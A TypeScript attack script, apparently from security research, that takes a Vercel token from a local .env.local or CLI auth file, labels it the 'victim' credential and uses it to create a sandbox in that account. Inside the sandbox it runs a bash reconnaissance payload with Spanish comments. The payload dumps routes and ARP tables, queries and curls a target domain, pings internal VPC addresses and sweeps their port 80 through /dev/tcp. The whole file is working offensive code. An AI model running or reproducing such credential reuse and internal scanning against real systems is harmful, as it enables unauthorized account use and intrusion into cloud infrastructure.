import { Sandbox } from "@vercel/sandbox";
import { readFileSync, writeFileSync } from "fs";

function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local", "utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json", "utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}

const VICTIM = loadToken();
if (!VICTIM) { console.error("no token"); process.exit(1); }
let V: any;
try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

const TARGET = "sb-1phoxyil6njl.vercel.run";

const CMD = `
set +e
echo "===== NET (dentro del sandbox) ====="
ip route
echo "--- arp ---"
ip neigh
echo "--- interfaz ---"
ip -o addr
echo ""
echo "===== 1. DNS del dominio VICTIMA desde dentro ====="
getent hosts ${TARGET}
echo "--- dig A ---"
dig +short A ${TARGET} 2>/dev/null
echo "--- dig +trace (2 saltos) ---"
dig +trace +time=2 +tries=1 ${TARGET} 2>/dev/null | head -20
echo "--- CNAME ---"
dig +short CNAME ${TARGET} 2>/dev/null
echo "--- NS ---"
dig +short NS ${TARGET} 2>/dev/null
echo "--- ANY-ish (txt) ---"
dig +short TXT ${TARGET} 2>/dev/null
echo ""
echo "===== 2. curl al dominio VICTIMA desde dentro ====="
timeout 8 curl -s -o /dev/null -w "code=%{http_code} remote=%{remote_ip} redirect=%{redirect_url}\\n" --max-time 6 "https://${TARGET}/" 2>&1 | tail -1
echo ""
echo "===== 3. alcanzabilidad rango VPC host (172.31.0.0/16) ====="
echo "--- probando 172.31.0.1, 172.31.0.2, 172.31.16.1, 172.31.16.7 (icmp+tcp80) ---"
for ip in 172.31.0.1 172.31.0.2 172.31.16.1 172.31.16.7; do
  ping -W 1 -c 1 $ip >/dev/null 2>&1 && echo "ICMP $ip OK" || echo "ICMP $ip LOSS"
done
for ip in 172.31.0.1 172.31.0.2 172.31.16.1 172.31.16.7; do
  timeout 3 bash -c "echo > /dev/tcp/$ip/80" 2>/dev/null && echo "TCP80 $ip OPEN" || echo "TCP80 $ip CLOSED"
done
echo "--- barrido rapido 172.31.16.0/24 puerto 80 (top 8) ---"
for i in 1 2 3 4 5 7 10 20 50 100 200; do
  timeout 1 bash -c "echo > /dev/tcp/172.31.16.$i/80" 2>/dev/null && echo "HOST 172.31.16.$i:80 OPEN" || true
done
echo ""
echo "===== 4. ruta hacia internet / gateway ====="
ip route get 1.1.1.1 2>/dev/null | head -2
echo "--- gateway reachability ---"
ip route | grep -E "default|100.64" | head -3
echo "===== DONE ====="
`;

async function main() {
  const sbx = await Sandbox.create({
    name: "recon-tgt-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  console.log("policy:", JSON.stringify(sbx.networkPolicy));
  const res = await sbx.runCommand("bash", ["-c", CMD], { wait: true, timeout: 90_000 });
  const out = await res.output("both");
  writeFileSync("/tmp/tgt_recon.txt", out);
  console.log(out);
  console.log("KEEP_ALIVE=" + sbx.domain(3000));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });